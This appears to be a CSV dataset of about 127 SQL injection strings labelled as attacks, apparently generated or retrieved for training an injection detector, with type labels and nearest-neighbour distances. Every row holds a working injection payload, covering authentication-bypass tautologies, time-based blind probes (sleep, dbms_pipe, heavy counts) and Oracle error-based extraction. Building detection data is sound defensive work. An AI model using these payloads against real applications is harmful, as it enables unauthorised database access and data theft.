id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_001402,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R008092,3.5174067536547975
GAN_001403,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.217813167634293
GAN_001404,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,6.575480335587849
GAN_001405,attack,boolean,"admin"" or 1  =  1#",nearest_attack_euclidean,R000045,3.4266046183287
GAN_001406,attack,boolean,"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R007211,4.423798036749282
GAN_001407,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R006497,4.19203309343742
GAN_001408,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,6.175358708495155
GAN_001409,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R007313,10.608368039424434
GAN_001410,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R007265,8.426701302893868
GAN_001411,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,4.1946544380385244
GAN_001412,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008380,4.362555920221605
GAN_001413,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.078432413563901
GAN_001414,attack,boolean,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",nearest_attack_euclidean,R001695,8.072248625474863
GAN_001415,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R007473,4.748550849832465
GAN_001416,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000139,4.940300360004794
GAN_001417,attack,boolean,"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R007814,7.867143966381805
GAN_001418,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,3.83557994265784
GAN_001419,attack,error,1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,nearest_attack_euclidean,R006050,17.6172161857446
GAN_001420,attack,time,1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,nearest_attack_euclidean,R008614,4.6721963746131046
GAN_001421,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,3.686480146771207
GAN_001422,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008170,3.9276120203587324
GAN_001423,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.674764824403152
GAN_001424,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R008186,7.346102477178543
GAN_001425,attack,boolean,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",nearest_attack_euclidean,R001834,7.797168035562773
GAN_001426,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R001168,6.099324060656111
GAN_001427,attack,other,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",nearest_attack_euclidean,R003441,5.509791957635808
GAN_001428,attack,boolean,"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007904,5.499392961118586
GAN_001429,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008521,4.82408665667141
GAN_001430,attack,boolean,"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl",nearest_attack_euclidean,R005178,5.38336643282999
GAN_001431,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,2.957211499452317
GAN_001432,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R006689,6.335312544462255
GAN_001433,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R002687,5.3707252489524855
GAN_001434,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,3.7722230881891394
GAN_001435,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R004775,4.713666269055908
GAN_001436,attack,boolean,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",nearest_attack_euclidean,R000968,5.9606286516716445
GAN_001437,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,3.8060006006216627
GAN_001438,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,6.153089887333521
GAN_001439,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006401,3.738980355142276
GAN_001440,attack,time,"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R008629,6.1345572117913845
GAN_001441,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,5.992471063526793
GAN_001442,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R005088,5.386706979182905
GAN_001443,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003001,6.860431158349812
GAN_001444,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R004633,8.93896140535893
GAN_001445,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R004102,5.762498253051083
GAN_001446,attack,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001903,4.9258210667049305
GAN_001447,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R007449,4.681709427913229
GAN_001448,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007806,4.4382570113059145
GAN_001449,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R001481,6.615674794337897
GAN_001450,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006401,3.197657816988734
GAN_001451,attack,boolean,"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R004450,4.50364008838912
GAN_001452,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R004089,5.005435481297506
GAN_001453,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R001168,4.595629261581508
GAN_001454,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006909,3.1598936663210537
GAN_001455,attack,boolean,admin' or '1'  =  '1,nearest_attack_euclidean,R000057,5.106313389450055
GAN_001456,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R006497,4.900858278691886
GAN_001457,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,5.617322418671495
GAN_001458,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R003310,6.717056773158235
GAN_001459,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,3.8745231488029686
GAN_001460,attack,other,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",nearest_attack_euclidean,R003441,5.031051602870279
GAN_001461,attack,time,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,nearest_attack_euclidean,R003320,4.286366700259708
GAN_001462,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,5.576495169352707
GAN_001463,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.686574524208043
GAN_001464,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000471,4.730801978823489
GAN_001465,attack,boolean,end and   (  'jzlr'  =  'jzlr,nearest_attack_euclidean,R008650,5.452732889855072
GAN_001466,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R004858,4.03325022108383
GAN_001467,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R005088,5.95319345694623
GAN_001468,attack,boolean,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",nearest_attack_euclidean,R005785,6.508636893448551
GAN_001469,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,4.414067484739423
GAN_001470,attack,other, (  sqlvuln  ) ,nearest_attack_euclidean,R000627,2.889535750704528
GAN_001471,attack,time,1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,nearest_attack_euclidean,R008614,6.184121707231761
GAN_001472,attack,boolean,"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001585,5.125982373725035
GAN_001473,attack,error,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006016,6.5487256147569015
GAN_001474,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R005102,4.157468201348378
GAN_001475,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,6.120714992180537
GAN_001476,attack,boolean,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",nearest_attack_euclidean,R002407,6.520640395578661
GAN_001477,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R007152,4.789437175062703
GAN_001478,attack,boolean,"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001909,3.0337844456681884
GAN_001479,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,5.453433113235493
GAN_001480,attack,boolean,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001220,5.678398956291259
GAN_001481,attack,boolean,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",nearest_attack_euclidean,R005785,5.791193034899406
GAN_001482,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R008542,5.696126323137493
GAN_001483,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,4.205418572273835
GAN_001484,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,6.460835683430947
GAN_001485,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",nearest_attack_euclidean,R006487,4.273039127398197
GAN_001486,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,4.025919672704829
GAN_001487,attack,boolean,"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001585,4.070840946517448
GAN_001488,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.531091280387704
GAN_001489,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R006685,10.055430248894275
GAN_001490,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R006584,6.268252994701913
GAN_001491,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,5.080974165463254
GAN_001492,attack,other,1'||  (  select 'idna' from dual where 2683  =  2683 rlike   (  select   (  case when   (  3201  =  9748  )   then 1 else 0x28 end   )    )     )  ||',nearest_attack_euclidean,R007658,9.457462836274141
GAN_001493,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,3.8636278779380735
GAN_001494,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.158460977403099
GAN_001495,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R006497,4.41245699332351
GAN_001496,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R002961,6.330880696597638
GAN_001497,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.998074476693405
GAN_001498,attack,boolean,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",nearest_attack_euclidean,R001695,9.321111902796883
GAN_001499,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R003310,6.1524123137085445
GAN_001500,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R002687,5.008989333869293
GAN_001501,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",nearest_attack_euclidean,R003290,5.475260715275041
GAN_001502,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R004858,6.442507453181746
GAN_001503,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,4.231208015805502
GAN_001504,attack,error,"1   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  6395  =  6395",nearest_attack_euclidean,R008817,5.619198639123455
GAN_001505,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,5.564768019915275
GAN_001506,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,4.1756562930719685
GAN_001507,attack,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R004982,4.175973740916814
GAN_001508,attack,error,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R008195,6.444890384520705
GAN_001509,attack,other, (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ,nearest_attack_euclidean,R001106,6.615129787453115
GAN_001510,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,4.393900584789067
GAN_001511,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R002687,7.140316800288782
GAN_001512,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,6.002623625241508
GAN_001513,attack,other,"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R001941,7.169775275922068
GAN_001514,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.092512282971544
GAN_001515,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R004761,3.1746531200264365
GAN_001516,attack,boolean,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000110,5.177256743444773
GAN_001517,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",nearest_attack_euclidean,R001093,5.381959823523119
GAN_001518,attack,error,"1 where 8333  =  8333 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003773,5.393364327697436
GAN_001519,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R005417,6.826182449968724
GAN_001520,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,3.9511810083708294
GAN_001521,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R007261,8.148954284186942
GAN_001522,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R004936,7.754456539693854
GAN_001523,attack,boolean,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R003917,3.9476449414866313
GAN_001524,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,4.430964911556543
GAN_001525,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R008186,6.590527389190653
GAN_001526,attack,boolean,"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R006867,2.8325715020994813
GAN_001527,attack,boolean,"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004023,5.580660706831287
GAN_001528,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""%""  =  """,nearest_attack_euclidean,R006903,4.547587648168941
